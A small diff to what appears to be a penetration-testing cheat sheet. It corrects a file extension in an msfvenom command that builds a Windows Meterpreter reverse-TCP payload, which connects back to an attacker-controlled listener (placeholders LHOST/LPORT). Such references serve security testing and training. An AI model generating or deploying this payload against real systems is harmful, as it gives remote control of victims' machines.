@@ -2498,7 +2498,7 @@ msf6 exploit(multi/handler) > run
 ###### Download Files
 
 ```c
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
 ```
 
 ```c
